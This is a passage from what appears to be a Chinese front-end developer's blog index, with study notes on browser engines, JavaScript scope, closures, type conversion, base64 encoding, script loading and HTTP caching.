那么在原始的前后中间加一层NodeJS，可以很好的划分职责并且解决一些问题：1、职责划分后端专注于服务层、数据格式、数据稳定、业务逻辑；前端专注于UI层、控只逻辑、渲染逻辑、交互、用户体验2、模版共享可以在浏览器和Node端用一样的模板3、路由共享假如需要在前端做浏览器端路由时，可以同时配置服务器端的路由，使其在 浏览器端换页 或是 服务端换页 ，都可以得到一致的渲染效果。同时也处理了SEO的问题。 总结前后端分离，不用纠结于概念，只要能满足业务需求，只要能达到技术要求就行，无非就是分离程度的区别！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[浏览器内核介绍]]></title>
      <url>http://yoursite.com/2017/04/04/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8%E4%BB%8B%E7%BB%8D/</url>
      <content type="text"><![CDATA[内核 本文引自主流浏览器内核介绍与变迁，主要介绍浏览器内核的发展历史。高程第九章介绍了浏览器的嗅探！ 首先得搞懂浏览器内核究竟指的是什么。 浏览器内核又可以分成两部分：渲染引擎(layout engineer 或者 Rendering Engine)和 JS 引擎。它负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核。JS 引擎则是解析 Javascript 语言，执行 javascript 语言来实现网页的动态效果。最开始渲染引擎和 JS 引擎并没有区分的很明确，后来 JS 引擎越来越独立，内核就倾向于只指渲染引擎。有一个网页标准计划小组制作了一个 ACID 来测试引擎的兼容性和性能。内核的种类很多，如加上没什么人使用的非商业的免费内核，可能会有 10 多种，但是常见的浏览器内核可以分这四种：Trident、Gecko、Blink、Webkit。 Trident ([‘traɪd(ə)nt])Trident(IE内核)：该内核程序在 1997 年的 IE4 中首次被采用，是微软在 Mosaic（”马赛克”，这是人类历史上第一个浏览器，从此网页可以在图形界面的窗口浏览） 代码的基础之上修改而来的，并沿用到 IE11，也被普遍称作 “IE内核”。 Trident实际上是一款开放的内核，其接口内核设计的相当成熟，因此才有许多采用 IE 内核而非 IE 的浏览器(壳浏览器)涌现。由于 IE 本身的 “垄断性”（虽然名义上 IE 并非垄断，但实际上，特别是从 Windows 95 年代一直到 XP 初期，就市场占有率来说 IE 的确借助 Windows 的东风处于 “垄断” 的地位）而使得 Trident 内核的长期一家独大，微软很长时间都并没有更新 Trident 内核，这导致了两个后果——一是 Trident 内核曾经几乎与 W3C 标准脱节（2005年），二是 Trident 内核的大量 Bug 等安全性问题没有得到及时解决，然后加上一些致力于开源的开发者和一些学者们公开自己认为 IE 浏览器不安全的观点，也有很多用户转向了其他浏览器，Firefox 和 Opera 就是这个时候兴起的。非 Trident 内核浏览器的市场占有率大幅提高也致使许多网页开发人员开始注意网页标准和非 IE浏览器的浏览效果问题。 补充：IE 从版本 11 开始，初步支持 WebGL 技术。IE8 的 JavaScript 引擎是 Jscript，IE9 开始用 Chakra，这两个版本区别很大，Chakra 无论是速度和标准化方面都很出色。 国内很多的双核浏览器的其中一核便是 Trident，美其名曰 “兼容模式”。 Window10 发布后，IE 将其内置浏览器命名为 Edge，Edge 最显著的特点就是新内核 EdgeHTML。关于 Edge 浏览器更多可以参考 如何评价 Microsoft Edge 浏览器？ Gecko ([‘gekəʊ])Gecko(Firefox 内核)：Netscape6 开始采用的内核，后来的 Mozilla FireFox(火狐浏览器) 也采用了该内核，Gecko 的特点是代码完全公开，因此，其可开发程度很高，全世界的程序员都可以为其编写代码，增加功能。因为这是个开源内核，因此受到许多人的青睐，Gecko 内核的浏览器也很多，这也是 Gecko 内核虽然年轻但市场占有率能够迅速提高的重要原因。 事实上，Gecko 引擎的由来跟 IE 不无关系，前面说过 IE 没有使用 W3C 的标准，这导致了微软内部一些开发人员的不满；他们与当时已经停止更新了的 Netscape 的一些员工一起创办了 Mozilla，以当时的 Mosaic 内核为基础重新编写内核，于是开发出了 Gecko。不过事实上，Gecko 内核的浏览器仍然还是 Firefox (火狐) 用户最多，所以有时也会被称为 Firefox 内核。此外 Gecko 也是一个跨平台内核，可以在Windows、 BSD、Linux 和 Mac OS X 中使用。 Webkit一提到 webkit，首先想到的便是 chrome，可以说，chrome 将 Webkit内核 深入人心，殊不知，Webkit 的鼻祖其实是 Safari。现在很多人错误地把 webkit 叫做 chrome内核（即使 chrome内核已经是 blink 了），苹果都哭瞎了有木有。 Safari 是苹果公司开发的浏览器，使用了KDE（Linux桌面系统）的 KHTML 作为浏览器的内核，Safari 所用浏览器内核的名称是大名鼎鼎的 WebKit。 Safari 在 2003 年 1 月 7 日首度发行测试版，并成为 Mac OS X v10.3 与之后版本的默认浏览器，也成为苹果其它系列产品的指定浏览器（也已支持 Windows 平台）。 如上述可知，WebKit 前身是 KDE 小组的 KHTML 引擎，可以说 WebKit 是 KHTML 的一个开源的分支。当年苹果在比较了 Gecko 和 KHTML 后，选择了后者来做引擎开发，是因为 KHTML 拥有清晰的源码结构和极快的渲染速度。 Webkit内核 可以说是以硬件盈利为主的苹果公司给软件行业的最大贡献之一。随后，2008 年谷歌公司发布 chrome 浏览器，采用的 chromium 内核便 fork 了 Webkit。 Chromium/Bink2008 年，谷歌公司发布了 chrome 浏览器，浏览器使用的内核被命名为 chromium。 chromium fork 自开源引擎 webkit，却把 WebKit 的代码梳理得可读性提高很多，所以以前可能需要一天进行编译的代码，现在只要两个小时就能搞定。因此 Chromium 引擎和其它基于 WebKit 的引擎所渲染页面的效果也是有出入的。所以有些地方会把 chromium 引擎和 webkit 区分开来单独介绍，而有的文章把 chromium 归入 webkit 引擎中，都是有一定道理的。 谷歌公司还研发了自己的 Javascript 引擎，V8，极大地提高了 Javascript 的运算速度。 chromium 问世后，带动了国产浏览器行业的发展。一些基于 chromium 的单核，双核浏览器如雨后春笋般拔地而起，例如 搜狗、360、QQ浏览器等等，无一不是套着不同的外壳用着相同的内核。 然而 2013 年 4 月 3 日，谷歌在 Chromium Blog 上发表 博客，称将与苹果的开源浏览器核心 Webkit 分道扬镳，在 Chromium 项目中研发 Blink 渲染引擎（即浏览器核心），内置于 Chrome 浏览器之中。 webkit 用的好好的，为何要投入到一个新的内核中去呢？ Blink 其实是 WebKit 的分支，如同 WebKit 是 KHTML 的分支。Google 的 Chromium 项目此前一直使用 WebKit(WebCore) 作为渲染引擎，但出于某种原因，并没有将其多进程架构移植入Webkit。 后来，由于苹果推出的 WebKit2 与 Chromium 的沙箱设计存在冲突，所以 Chromium 一直停留在 WebKit，并使用移植的方式来实现和主线 WebKit2 的对接。这增加了 Chromium 的复杂性，且在一定程度上影响了 Chromium 的架构移植工作。 基于以上原因，Google 决定从 WebKit 衍生出自己的 Blink 引擎（后由 Google 和 Opera Software 共同研发），将在 WebKit 代码的基础上研发更加快速和简约的渲染引擎，并逐步脱离 WebKit 的影响，创造一个完全独立的 Blink 引擎。这样以来，唯一一条维系 Google 和苹果之间技术关系的纽带就这样被切断了。 Google 和苹果在多个领域都是竞争对手，而唯独在浏览器引擎上有技术合作，利益一致。但为了各自的利益，谁都不会拿出 100% 的 “诚意” 来做好 WebKit，因为你做出来的成果竞争对手可以直接享用。移动互联网已经崛起，手机和平板设备端必将成为浏览器的另一个战场。这个时候，如果 Google 跟苹果仍然黏在一起，将会严重阻碍双方的进步，也会阻碍 WebKit 的进步。 据说 Blink 删除了 880w 行 webkit 代码。 至于为什么叫 blink？有兴趣的可以看下这篇访谈 Paul Irish on Chrome Moving to Blink。Blink 引擎问世后，国产各种 chrome 系的浏览器也纷纷投入 Blink 的怀抱，可以在浏览器地址栏输入 chrome://version 进行查看。 Presto ([‘prestəʊ])Presto 是挪威产浏览器 opera 的 “前任” 内核，为何说是 “前任”，因为最新的 opera 浏览器早已将之抛弃从而投入到了谷歌大本营。 Opera 的一个里程碑作品是 Opera7.0，因为它使用了 Opera Software 自主开发的 Presto 渲染引擎，取代了旧版 Opera 4 至 6 版本使用的 Elektra 排版引擎。该款引擎的特点就是渲染速度的优化达到了极致，然而代价是牺牲了网页的兼容性。 Presto 加入了动态功能，例如网页或其部分可随着 DOM 及 Script 语法的事件而重新排版。Presto 在推出后不断有更新版本推出，使不少错误得以修正，以及阅读 Javascript 效能得以最佳化，并成为当时速度最快的引擎。 然而为了减少研发成本，Opera 在 2013 年 2 月宣布放弃 Presto，转而跟随 Chrome 使用 WebKit 分支的 Chromium 引擎作为自家浏览器核心引擎，Presto 内核的 Opera 浏览器版本永远的停留在了 12.17。在 Chrome 于 2013 年推出 Blink 引擎之后，Opera 也紧跟其脚步表示将转而使用 Blink 作为浏览器核心引擎。 Presto 与开源的 WebKit 和经过谷歌加持的 Chromium 系列相比毫无推广上的优势，这是 Opera 转投 WebKit 的主要原因，并且使用 WebKit 内核的 Opera 浏览器可以兼容谷歌 Chrome 浏览器海量的插件资源。但是换内核的代价对于 Opera 来说过于惨痛。使用谷歌的 WebKit 内核之后，原本快速，轻量化，稳定的 Opera 浏览器变得异常的卡顿，而且表现不稳定，Opera 原本旧内核浏览器书签同步到新内核上的工作 Opera 花了整整两年时间，期间很多 Opera 的用户纷纷转投谷歌浏览器和其他浏览器，造成了众多的用户流失。时至今日现在还有上千万人在使用老版本的 Opera。 很多人都认为 Opera 浏览器终止在了 12.17，此后所更新的 Opera 版本号不再是原来那个 Opera。 说好的 Presto Forever 呢？ 关于移动端移动端的浏览器内核主要说的是系统内置浏览器的内核。 目前移动设备浏览器上常用的内核有 Webkit，Blink，Trident，Gecko 等，其中 iPhone 和 iPad 等苹果 iOS 平台主要是 WebKit，Android 4.4 之前的 Android 系统浏览器内核是 WebKit，Android4.4 系统浏览器切换到了Chromium，内核是 Webkit 的分支 Blink，Windows Phone 8 系统浏览器内核是 Trident。 总结浏览器内核主要指的是浏览器的渲染引擎，2013 年以前，代表有 Trident（IE），Gecko（firefox），Webkit（Safari chrome 等）以及 Presto（opera)。2013 年，谷歌开始研发 blink 引擎，chrome 28 以后开始使用，而 opera 则放弃了自主研发的 Presto 引擎，投入谷歌怀抱，和谷歌一起研发 blink 引擎，国内各种 chrome系的浏览器（360、UC、QQ、2345 等等）也纷纷放弃 webkit，投入 blink 的怀抱。 还有一点文章里没有说的很明白，就是 Webkit 其实是 KHTML 的分支，这里的 KHTML 指渲染引擎，Webkit 其实就泛指了 Webkit 的渲染引擎 WebCore，而 Webkit 引擎的 Javascript 引擎 JSCore 则是 KJS 的分支。而 chrome 则搭载了自己的 Javascript 引擎 V8。引用 各主流浏览器内核介绍 里的一段话： 我们上面提到 Chrome 是基于 WebKit 的分支，而 WebKit 又由渲染引擎 “WebCore” 和 JS 解释引擎 “JSCore” 组成，可能会让你搞不清 V8 和 JSCore 的关系。你可以这样理解—— WebKit 是一块主板，JSCore 是一块可拆卸的内存条，谷歌实际上认为 Webkit 中的 JSCore 不够好，才自己搞了一个 V8 JS 引擎，这就是 Chrome 比 Safari 在某些 JS 测试中效率更高的原因。 如果说 chromium 还不足以脱离 Webkit 的 “帽子”，Blink 的出现，代表着 chrome 将自主研发渲染引擎（Blink）以及 Javascript 引擎（V8）。可以期待在不久的将来，人们谈起 chrome 想到的不是 Webkit 而是 Blink。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[in操作符]]></title>
      <url>http://yoursite.com/2017/03/29/in%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
      <content type="text"><![CDATA[单独使用in 无论属性是在实例中还是原型中 function Person()&#123;&#125;Person.prototype.name = "Nicholas";Person.prototype.age = 29;Person.prototype.job = "Software Engineer";Person.prototype.sayName = function()&#123; alert(this.name);&#125;;var person = new Person();alert(person.hasOwnProperty("name")); //falsealert("name" in person); //true for…in 可以通过对象可访问的，可枚举的，包括实例中和原型中 屏蔽了原型中不可枚举属性的实例属性也会被返回，因为根据规定所有开发人员定义的属性都是可枚举的————只有在IE8及更早版本有例外 var o = &#123; toString : function()&#123; return "My Object"; &#125;&#125;;for (var prop in o)&#123; if (prop == "toString")&#123; alert("Found toString");// IE中不显示 &#125; &#125; 在一般的浏览器都可以弹出alert，在IE8-下，由于认为原型中的toString是不可枚举的，所以跳过该属性。 判断是否可枚举，用propertyIsEnumerable判断：var str = "djdfhdf";str.propertyIsEnumerable("valueOf");//false Object.keys 获取可枚举的实例属性 function Person()&#123;&#125;Person.prototype.name = "Nicholas";Person.prototype.age = 29;Person.prototype.job = "Software Engineer";Person.prototype.sayName = function()&#123; alert(this.name);&#125;;var keys = Object.keys(Person.prototype);alert(keys); //"name,age,job,sayName"var p1 = new Person();p1.name = "Rob";p1.age = 31;var p1keys = Object.keys(p1);alert(p1keys); //"name,age" Object.getOwnPropertyNames 获取所有实例属性，无论是否可枚举 var keys = Object.getOwnPropertyNames(Person.prototype); alert(keys); //"constructor,name,age,job,sayName"]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[作用域+闭包]]></title>
      <url>http://yoursite.com/2017/03/26/%E4%BD%9C%E7%94%A8%E5%9F%9F-%E9%97%AD%E5%8C%85/</url>
      <content type="text"><![CDATA[作用域链 作用域就是变量和函数的可访问范围 作用域链是保证对执行环境有权访问的所有变量和函数的有序访问。 作用域链的前端始终都是当前执行的代码所在环境的变量对象，如果这个环境是函数，则将其活动对象作为变量对象。 作用域链中的下一个变量对象来自包含（外部）环境，而再下一个变量对象则来自下一个包含环境，这样一直延续到全局执行环境。 全局执行环境的变量对象始终都是作用域链中最后一个对象 闭包闭包是在某个作用域内定义的函数，它可以访问这个作用域内的所有变量。闭包作用域链通常包括三个部分： 函数本身作用域。 闭包定义时的作用域。 全局作用域。 闭包常见用途： 创建特权方法用于访问控制（比如可以读取函数内部的变量） 让这些变量的值始终保持在内存中。 事件处理程序及回调 函数的生命周期函数的的生命周期分为创建和激活阶段（调用时） 函数创建函数声明属于VO对象，在进入上下文阶段创建函数表达式不属于VO对象，在执行上下文阶段创建 函数的激活 [[scope]]是所有父变量对象的层级链，处于当前函数上下文之上，在函数创建时存于其中。 用一个稍微复杂的例子描述上面讲到的这些:var x = 10;function foo() &#123; var y = 20; function bar() &#123; var z = 30; alert(x + y + z); &#125; bar();&#125;foo(); // 60 全局上下文的变量对象是：globalContext.VO === Global = &#123; x: 10 foo: &lt;reference to function&gt;&#125;; 在“foo”创建时，“foo”的[[scope]]属性是：foo.[[Scope]] = [ globalContext.VO]; 在“foo”激活时（进入上下文），“foo”上下文的活动对象是：fooContext.AO = &#123; y: 20, bar: &lt;reference to function&gt;&#125;; “foo”上下文的作用域链为：fooContext.Scope = fooContext.AO + foo.[[Scope]] // i.e.:fooContext.Scope = [ fooContext.AO, globalContext.VO]; 内部函数“bar”创建时，其[[scope]]为：bar.[[Scope]] = [ fooContext.AO, globalContext.VO]; 在“bar”激活时，“bar”上下文的活动对象为：barContext.AO = &#123; z: 30&#125;; “bar”上下文的作用域链为：barContext.Scope = barContext.AO + bar.[[Scope]] // i.e.:barContext.Scope = [ barContext.AO, fooContext.AO, globalContext.VO]; 内存管理1、标记清除2、引用计数（高程P97） 引用计数有相互引用问题 因为闭包的作用域链对外部环境的活动对象存在引用，所以在外部函数执行完毕后，外部函数的活动对象不会被销毁！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[编码]]></title>
      <url>http://yoursite.com/2017/03/21/%E7%BC%96%E7%A0%81/</url>
      <content type="text"><![CDATA[字符串与Unicode编码的互相转换var str = "中文";var code = str.charCodeAt(0); // 20013// 转为16进制数组var code16 = code.toString(16); // "4e2d"// 变成字面量表示法var ustr = "\\u"+code16; // "\u4e2d"// 包装为JSONvar jsonstr = '&#123;"ustr": "'+ ustr +'"&#125;'; //'&#123;"ustr": "\u4e2d"&#125;'// 使用JSON工具转换var obj = JSON.parse(jsonstr); // Object &#123;ustr: "中"&#125; base64原理Base64编码将三个8位子节序列拆散为四个6位的片段，并为每个6位的片短分配一个字符，这个字符是Base64字母表中的64个字符之一。 由于base64编码用了8位字符来表示信息中的6个位，所以base64编码字符串大约比原始值扩大了33%。 下面是一个简单的base64编码实例。在这里，三个字符组成的输入值“Ow!”是base64编码的，得到的是4个字符的base64编码值“T3ch”。它是按以下方式工作的。 字符串”Ow!”被拆分成3个8位的字节(0x4F、0x77、0x21)。 这3个字节构成了一个24为的二进制01001111 01110111 00100001。 这些为被划分为一些6位的序列010011、110111、011100、1000001. 每个6位值都表示了从0～63之间的数字，对应base64字母表中的64个字符之一。得到的base64编码字符串是4个字符的字符串“T3ch”。然后就可以通过线路将这个字符串作为“安全的”8位字符传送出去，因为只用了一些移植性最好的字符(字母、数字等)。 填充方式： base64编码收到一个8位字节序列，将这个二进制序列流划分成6位的块。二进制序列有时不能正好平均地分为6位的块，在这种情况下，就在序列末尾填充零位，使二进制序列的长度成为24的倍数(6和8的最小公倍数)。 对已填充的二进制进行编码时，任何完全填充(不包括原始数组中的位)的6位组都有特殊的第65个符号”=”表示。如果6位组是部分填充的，就将填充位设置为0. 下面会写一个填充实例。初始输入字符串为”a:a”为3个字节(24位)。24是6和8的倍数，因此按照上面给出的例子计算。无需填充就会得到base64编码为”YTph”。然而，再增加一个字符，输入字符串变为”a:aa”,转换为二进制就会有32位长。而6和8的下一个公倍数为48.因此要添加16位的填充码。填充的前4位是与数据位混合在一起的。得到的6位组01xxxx，会被当作010000、十进制中的16，或者base64编码的Q来处理。剩下的两个6位组都是填充码，用=来表示。a:a -- 011000 010011 101001 100001 -- YTpha:aa -- 011000 010011 101001 100001 011000 01xxxx xxxxxx xxxxxx -- YTphYQ==a:aaa -- 011000 010011 101001 100001 011000 010110 0001xx xxxxxx -- YTphYWE=a:aaaa -- 011000 010011 101001 100001 011000 010110 000101 1000001 -- YTphYWFh 最新的浏览器提供了自动生成base64的方法atob和btobbtoa('a:a')// =&gt; "YTph"atob('YTph')// =&gt; "a:a" escapeescape将会转义除了@*_+-./以外的所有字符，当小于0xFF时表示为 %xx，大于时表示为%uxxxx。例如：escape("abc123"); // "abc123"escape("äöü"); // "%E4%F6%FC"escape("ć"); // "%u0107"// 特殊字符escape("@*_+-./"); // "@*_+-./" 经测试ascii中的字母和数字会原样返回！！！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Number-parseInt-parseFloat-String]]></title>
      <url>http://yoursite.com/2017/03/20/Number-parseInt-parseFloat/</url>
      <content type="text"><![CDATA[Number true和false分别转化为1和0 如果是数值，原样返回 null返回0 undefined返回NaN 如果是字符串：1、如果字符串只包含数字（包括前面带正号和负号的情况），则将其转化为十进制数值，即”1”会变成1，”123”会变成123，而”011”会变成11（前导的0被忽略了）2、如果字符串包含有效的浮点格式，如”1.1”，则将其转化为对应的浮点数值（前导的0被忽略了）3、如果字符串包含有效的十六进制格式，例如”0xf”，则将其转化为相同大小的十进制整数值4、如果字符串是空的（不包含任何字符），则将其转化为05、如果字符串中包含上述格式之外的数值，则将其转化为NaN 如果是对象，则调用对象的valueOf方法，然后依照前面的规则转换返回的值。如果转换的结果是NaN，则调用对象的toString方法，然后再次依照前面的规则转换返回的值。 var obj=&#123;valueOf:function()&#123;return 1&#125;&#125;Number(obj) //1var obj=&#123;toString:function()&#123;return 2&#125;&#125;Number(obj) //2 parseInt 忽略前面的空格，直到找到第一个非空格字符 如果第一个字符不是数字字符或者正负符号，返回NaN（空字符串会返回NaN） 如果第一个字符是有效字符，会继续解析第二个字符，直到解析完所有后续字符或者遇到了一个非数字字符，例如”1234blue”转化为”1234”，”22.5”转化为”22”（小数点也被认为是非数字字符） 如果字符串以0x或者0开头，后面跟着数字字符，就会被当做十六进制或者八进制解析（ES5不具备解析八进制的能力，会当做十进制解析）var num = parseInt("0xAF") //175var num = parseInt("0xAF",16) //175var num = parseInt("AF",16) //175var num = parseInt("AF") //NaNvar num1 = parseInt("10", 2);//2var num2 = parseInt("10", 8);//8var num3 = parseInt("10", 10);//10var num4 = parseInt("10", 16);//16var num5 = parseInt("010");//10var num6 = parseInt("010",8);//8 parseFloat 忽略前面的空格，直到找到第一个非空格字符 如果第一个字符不是数字字符或者正负符号，返回NaN（空字符串会返回NaN） 如果第一个字符是有效字符，会继续解析第二个字符，直到解析完所有后续字符或者遇到了一个无效浮点字符，即只有第一个小数点是有效，例如”12.3.4”转化为”12.3” 会忽略所有前导的零 十六进制格式会始终被转化为0 如果小数点后面都是0，会返回整数var num1 = parseFloat("1234blue");//1234var num2 = parseFloat("0xA");//0var num3 = parseFloat("22.5");//22.5var num4 = parseFloat("22.34.5");//22.34var num5 = parseFloat("0908.5");//908.5var num6 = parseFloat("3.125e7");//31250000 toString 数值、布尔值、对象和字符串都是toString方法，null和undefined没有这个方法 如果数值调用toString方法，可以传递基数var num = 10;alert(num.toString());//"10"alert(num.toString(2));//"1010"alert(num.toString(8));//"12"alert(num.toString(10));//"10"alert(num.toString(16));//"a" String 如果有toString方法就调用，如上 null返回”null” undefined返回”undefined”var value1 = 10;var value2 = true;var value3 = null;var value4;alert(String(value1));//"10"alert(String(value2));//"true"alert(String(value3));//"null"alert(String(value4));//"undefined"]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[文档模式]]></title>
      <url>http://yoursite.com/2017/03/19/%E6%96%87%E6%A1%A3%E6%A8%A1%E5%BC%8F/</url>
      <content type="text"><![CDATA[文档模式 混杂模式（quirks mode） 标准模式（standards mode） 如果文档开始处没有发现文档声明，则所有浏览器都会默认开启混杂模式 标准模式 标准模式也分为标准模式和非标准模式 标准模式 4.0.1 严格型 &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt; HTMML 5 &lt;!DOCTYPE html&gt; 准标准模式 4.0.1 过度型 &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt; 4.0.1 框架集型 &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd"&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[asyn-defer]]></title>
      <url>http://yoursite.com/2017/03/19/asyn-defer/</url>
      <content type="text"><![CDATA[&lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;没有defer或async，浏览器会立即加载并执行指定的脚本，“立即”指的是在渲染该 script标签之下的文档元素之前，也就是说不等待后续载入的文档元素，读到就加载并执行。 &lt;script async src=&quot;script.js&quot;&gt;&lt;/script&gt;有async，加载和渲染后续文档元素的过程将和script.js的加载与执行并行进行（异步）。 &lt;script defer src=&quot;myscript.js&quot;&gt;&lt;/script&gt;有defer，加载后续文档元素的过程将和script.js的加载并行进行（异步），但是script.js的执行要在所有元素解析完成之后，DOMContentLoaded事件触发之前完成(现实中并不一定会在DOMContentLoaded前面触发)。 然后从实用角度来说呢，首先把所有脚本都丢到&lt;/body&gt;之前是最佳实践，因为对于旧浏览器来说这是唯一的优化选择，此法可保证非脚本的其他一切元素能够以最快的速度得到加载和解析。 接着，我们来看一张图咯： 此图告诉我们以下几个要点： defer和async在网络读取（下载）这块儿是一样的，都是异步的（相较于HTML解析） 它俩的差别在于脚本下载完之后何时执行，显然defer是最接近我们对于应用脚本加载和执行的要求的 带有defer属性的脚本执行也不一定按照顺序执行，有风险。 async则是一个乱序执行的主，反正对它来说脚本的加载和执行是紧紧挨着的，所以不管你声明的顺序如何，只要它加载完了就会立刻执行 async一定会在load之前加载，但可能会在DOMContentLoaded事件触发之前或者之后处理 async对于应用脚本的用处不大，因为它完全不考虑依赖（哪怕是最低级的顺序执行），不过它对于那些可以不依赖任何脚本或不被任何脚本依赖的脚本来说却是非常合适的，最典型的例子：Google Analytics]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[从浏览器地址栏输入url到显示页面的步骤]]></title>
      <url>http://yoursite.com/2017/03/15/%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5url%E5%88%B0%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%AD%A5%E9%AA%A4/</url>
      <content type="text"><![CDATA[强缓存当浏览器对某个资源的请求命中了强缓存时，返回的http状态为200，在chrome的开发者工具的network里面size会显示为from cache，强缓存是利用Expires或者Cache-Control这两个http response header实现的，它们都用来表示资源在客户端缓存的有效期，Expires是http1.0提出的一个表示资源过期时间的header，它描述的是一个绝对时间，由服务器返回，用GMT格式的字符串表示，如：Expires:Thu, 31 Dec 2037 23:55:55 GMT，原理如下： 浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上Expires的header，如： 浏览器在接收到这个资源后，会把这个资源连同所有response header一起缓存下来（所以缓存命中的请求返回的header并不是来自服务器，而是来自之前缓存的header）； 浏览器再请求这个资源时，先从缓存中寻找，找到这个资源后，拿出它的Expires跟当前的请求时间比较，如果请求时间在Expires指定的时间之前，就能命中缓存，否则就不行。 如果缓存没有命中，浏览器直接从服务器加载资源时，Expires Header在重新加载的时候会被更新。 Expires是较老的强缓存管理header，由于它是服务器返回的一个绝对时间，在服务器时间与客户端时间相差较大时，缓存管理容易出现问题，比如随意修改下客户端时间，就能影响缓存命中的结果。所以在http1.1的时候，提出了一个新的header，就是Cache-Control，这是一个相对时间，在配置缓存的时候，以秒为单位，用数值表示，如：Cache-Control:max-age=315360000，它的缓存原理是： 浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上Cache-Control的header，如： 浏览器在接收到这个资源后，会把这个资源连同所有response header一起缓存下来； 浏览器再请求这个资源时，先从缓存中寻找，找到这个资源后，根据它第一次的请求时间和Cache-Control设定的有效期，计算出一个资源过期时间，再拿这个过期时间跟当前的请求时间比较，如果请求时间在过期时间之前，就能命中缓存，否则就不行。 如果缓存没有命中，浏览器直接从服务器加载资源时，Cache-Control Header在重新加载的时候会被更新。 Cache-Control描述的是一个相对时间，在进行缓存命中的时候，都是利用客户端时间进行判断，所以相比较Expires，Cache-Control的缓存管理更有效，安全一些。 这两个header可以只启用一个，也可以同时启用，当response header中，Expires和Cache-Control同时存在时，Cache-Control优先级高于Expires. http连接如果强缓存没有命中，那就要向服务器发请求了： 浏览器解析URL获取协议，主机，端口，path 浏览器组装一个HTTP（GET）请求报文 浏览器获取主机ip地址 1、浏览器缓存2、本机缓存3、hosts文件4、路由器缓存5、ISP DNS缓存6、DNS递归查询 打开一个socket与目标IP地址，端口建立TCP链接，三次握手如下： 客户端发送一个TCP的SYN=1，Seq=X的包到服务器端口服务器发回SYN=1， ACK=X+1， Seq=Y的响应包客户端发送ACK=Y+1， Seq=Z TCP链接建立后发送HTTP请求 服务器接受请求并解析，将请求转发到服务程序，如虚拟主机使用HTTP Host头部判断请求的服务程序 为什么需要“三次握手”？在谢希仁著《计算机网络》第四版中讲“三次握手”的目的是“为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误”。在另一部经典的《计算机网络》一书中讲“三次握手”的目的是为了解决“网络中存在延迟的重复分组”的问题。这两种不用的表述其实阐明的是同一个问题。谢希仁版《计算机网络》中的例子是这样的，“已失效的连接请求报文段”的产生在这样一种情况下：client发出的第一个连接请求报文段并没有丢失，而是在某个网络结点长时间的滞留了，以致延误到连接释放以后的某个时间才到达server。本来这是一个早已失效的报文段。但server收到此失效的连接请求报文段后，就误认为是client再次发出的一个新的连接请求。于是就向client发出确认报文段，同意建立连接。假设不采用“三次握手”，那么只要server发出确认，新的连接就建立了。由于现在client并没有发出建立连接的请求，因此不会理睬server的确认，也不会向server发送数据。但server却以为新的运输连接已经建立，并一直等待client发来数据。这样，server的很多资源就白白浪费掉了。采用“三次握手”的办法可以防止上述现象发生。例如刚才那种情况，client不会向server的确认发出确认。server由于收不到确认，就知道client并没有要求建立连接。”。主要目的防止server端一直等待，浪费资源。 协商缓存此时请求来到了服务器，服务器检查HTTP请求头是否包含缓存验证信息，如果协商缓存命中，请求响应返回的http状态为304并且会显示一个Not Modified的字符串。协商缓存是利用的是【Last-Modified，If-Modified-Since】和【ETag、If-None-Match】这两对Header来管理的。原理如下： 浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上Last-Modified的header，这个header表示这个资源在服务器上的最后修改时间： 浏览器再次跟服务器请求这个资源时，在request的header上加上If-Modified-Since的header，这个header的值就是上一次请求时返回的Last-Modified的值： 服务器再次收到资源请求时，根据浏览器传过来If-Modified-Since和资源在服务器上的最后修改时间判断资源是否有变化，如果没有变化则返回304 Not Modified，但是不会返回资源内容；如果有变化，就正常返回资源内容。当服务器返回304 Not Modified的响应时，response header中不会再添加Last-Modified的header，因为既然资源没有变化，那么Last-Modified也就不会改变。 浏览器收到304的响应后，就会从缓存中加载资源。 如果协商缓存没有命中，浏览器直接从服务器加载资源时，Last-Modified Header在重新加载的时候会被更新，下次请求时，If-Modified-Since会启用上次返回的Last-Modified值。 【Last-Modified，If-Modified-Since】都是根据服务器时间返回的header，一般来说，在没有调整服务器时间和篡改客户端缓存的情况下，这两个header配合起来管理协商缓存是非常可靠的，但是有时候也会服务器上资源其实有变化，但是最后修改时间却没有变化的情况，而这种问题又很不容易被定位出来，而当这种情况出现的时候，就会影响协商缓存的可靠性。所以就有了另外一对header来管理协商缓存，这对header就是【ETag、If-None-Match】。它们的缓存管理的方式是： 浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上ETag的header，这个header是服务器根据当前请求的资源生成的一个唯一标识，这个唯一标识是一个字符串，只要资源有变化这个串就不同，跟最后修改时间没有关系，所以能很好的补充Last-Modified的问题： 浏览器再次跟服务器请求这个资源时，在request的header上加上If-None-Match的header，这个header的值就是上一次请求时返回的ETag的值： 